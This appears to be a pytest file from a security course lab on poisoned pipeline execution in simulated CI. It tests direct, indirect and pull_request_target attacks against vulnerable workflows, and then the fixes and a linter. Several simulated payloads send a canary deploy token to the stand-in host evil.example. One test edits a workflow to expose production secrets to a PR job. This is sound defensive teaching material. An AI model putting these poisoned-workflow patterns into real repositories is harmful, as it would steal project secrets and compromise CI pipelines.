"""Poisoned Pipeline Execution tests: direct, indirect and pull_request_target attacks, then the fixes.

All "attacks" run in a simulated CI. The only thing stolen is a canary.

Run from the repository root:
    python -m pytest caisp-course/ch4-ai-attacks-and-defenses-devops/labs/poisoned-pipeline -v
"""

from pathlib import Path

import pytest

from aisec_lab import load_lab_module, make_canary

ci = load_lab_module(__file__, "ci_sim")
W = Path(__file__).resolve().parent / "workflows"
CANARY = make_canary("DEPLOYTOKEN")

VULN_CI = (W / "vulnerable-ci.yml").read_text(encoding="utf-8")
VULN_PRT = (W / "vulnerable-pr-target.yml").read_text(encoding="utf-8")
SECURE_CI = (W / "secure-ci.yml").read_text(encoding="utf-8")
SECURE_PRT = (W / "secure-pr-target.yml").read_text(encoding="utf-8")

# ---- the three attacks (payloads are simulated commands) ------------------------------
DIRECT = ci.PullRequest({".github/workflows/ci.yml": VULN_CI.replace(
    "      - run: make test", "      - run: exfil DEPLOY_TOKEN evil.example")})
DIRECT_FORK = ci.PullRequest(DIRECT.changes, from_fork=True)
INDIRECT = ci.PullRequest({"Makefile": "test:\n\techo running tests\n\texfil DEPLOY_TOKEN evil.example"})
INDIRECT_SCRIPT = ci.PullRequest({"scripts/test.sh": "exfil DEPLOY_TOKEN evil.example"}, from_fork=True)
BENIGN = ci.PullRequest({"src/app.py": "print('app v2')", "README.md": "Updated docs."})

CI_PATH = ".github/workflows/ci.yml"


def vulnerable_runner():
    return ci.Runner({"DEPLOY_TOKEN": CANARY})


def secure_runner(**kw):
    settings = ci.Settings(require_fork_approval=True, protected_paths=ci.PROTECTED_PATHS,
                           environment_secrets_only_on_push=True)
    for k, v in kw.items():
        setattr(settings, k, v)
    return ci.Runner({}, {"DEPLOY_TOKEN": CANARY}, settings)


# ---------- Part 1: the attacks work against the vulnerable setup ---------------------------

def test_direct_ppe_the_pr_edits_the_workflow_and_steals_the_secret():
    res = vulnerable_runner().run(CI_PATH, VULN_CI, DIRECT, "pull_request")
    assert res.leaked(CANARY) and res.network_log[0][0] == "evil.example"


def test_indirect_ppe_the_workflow_is_untouched_but_the_makefile_is_poisoned():
    assert INDIRECT.changes.keys() == {"Makefile"}
    res = vulnerable_runner().run(CI_PATH, VULN_CI, INDIRECT, "pull_request")
    assert res.leaked(CANARY)


def test_pull_request_target_with_head_checkout_runs_fork_code_with_secrets():
    res = vulnerable_runner().run(".github/workflows/pr-eval.yml", VULN_PRT, INDIRECT_SCRIPT, "pull_request_target")
    assert res.leaked(CANARY)
    assert res.token_permissions == "write-all"


def test_github_style_fork_rule_pull_request_from_a_fork_gets_no_secrets():
    res = vulnerable_runner().run(CI_PATH, VULN_CI, DIRECT_FORK, "pull_request")
    assert not res.leaked(CANARY) and res.token_permissions == "read"  # this is why insiders and pull_request_target matter


# ---------- Part 2: the fixes -----------------------------------------------------------------

@pytest.mark.parametrize("pr,event,wf_text,path", [
    (DIRECT, "pull_request", SECURE_CI, CI_PATH),
    (INDIRECT, "pull_request", SECURE_CI, CI_PATH),
    (INDIRECT_SCRIPT, "pull_request_target", SECURE_PRT, ".github/workflows/pr-label.yml"),
])
def test_secure_setup_never_leaks(pr, event, wf_text, path):
    res = secure_runner().run(path, wf_text, pr, event)
    assert not res.leaked(CANARY)


def test_environment_secrets_alone_hold_even_if_every_other_control_is_off():
    """Hard layer: PR code never receives the deploy token, so there is nothing to steal."""
    runner = secure_runner(require_fork_approval=False, protected_paths=())
    poisoned_workflow = SECURE_CI.replace("      - run: make test\n  deploy", "      - run: exfil DEPLOY_TOKEN evil.example\n  deploy")
    for pr in (ci.PullRequest({CI_PATH: poisoned_workflow}), INDIRECT):
        res = runner.run(CI_PATH, SECURE_CI, pr, "pull_request")
        assert not res.leaked(CANARY) and "DEPLOY_TOKEN" not in res.secrets_in_env


def test_attacker_who_adds_the_environment_to_the_test_job_still_gets_nothing_on_a_pr():
    evil = SECURE_CI.replace("  test:\n    runs-on: ubuntu-latest\n", "  test:\n    runs-on: ubuntu-latest\n    environment: production\n    env:\n      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}\n", 1)
    evil = evil.replace("      - run: make test\n  deploy:", "      - run: exfil DEPLOY_TOKEN evil.example\n  deploy:")
    pr = ci.PullRequest({CI_PATH: evil})
    res = secure_runner(protected_paths=()).run(CI_PATH, SECURE_CI, pr, "pull_request")
    assert not res.leaked(CANARY)  # branch policy: environment secrets only on push to main


def test_protected_files_block_a_poisoned_pr_until_a_code_owner_reviews():
    res = secure_runner(environment_secrets_only_on_push=False).run(CI_PATH, SECURE_CI, INDIRECT, "pull_request")
    assert res.blocked.startswith("protected pipeline file changed") and res.network_log == []


def test_fork_pr_needs_maintainer_approval_before_any_workflow_runs():
    res = secure_runner(protected_paths=()).run(CI_PATH, SECURE_CI, INDIRECT_SCRIPT, "pull_request")
    assert res.blocked == "workflow run awaits maintainer approval"


def test_approval_is_a_human_control_a_careless_approval_runs_the_code_but_there_are_no_secrets():
    pr = ci.PullRequest(INDIRECT.changes, from_fork=True, approved_by_maintainer=True, reviewed_by_code_owner=True)
    res = secure_runner().run(CI_PATH, SECURE_CI, pr, "pull_request")
    assert res.network_log == [("evil.example", "")]  # the code ran, but stole an empty string


def test_least_privilege_token_is_read_only_in_the_secure_workflow():
    res = secure_runner().run(CI_PATH, SECURE_CI, BENIGN, "pull_request")
    assert res.token_permissions == "read"


def test_deploy_job_still_works_on_main_with_the_environment_secret():
    res = secure_runner().run(CI_PATH, SECURE_CI, None, "push", branch="main")
    assert "DEPLOY_TOKEN" in res.secrets_in_env and res.network_log == []


def test_benign_pr_runs_the_tests_in_the_secure_setup():
    res = secure_runner().run(CI_PATH, SECURE_CI, BENIGN, "pull_request")
    assert not res.blocked and "tests passed" in " ".join(res.output)


# ---------- Part 3: a linter spots the dangerous patterns ---------------------------------------

def test_lint_flags_the_vulnerable_workflows():
    assert any(f.startswith("PPE-1") for f in ci.lint_ppe(VULN_PRT))
    assert any(f.startswith("PPE-2") for f in ci.lint_ppe(VULN_CI))
    assert any(f.startswith("PPE-3") for f in ci.lint_ppe(VULN_CI))


def test_lint_is_quiet_on_the_secure_workflows():
    assert ci.lint_ppe(SECURE_CI) == [] and ci.lint_ppe(SECURE_PRT) == []
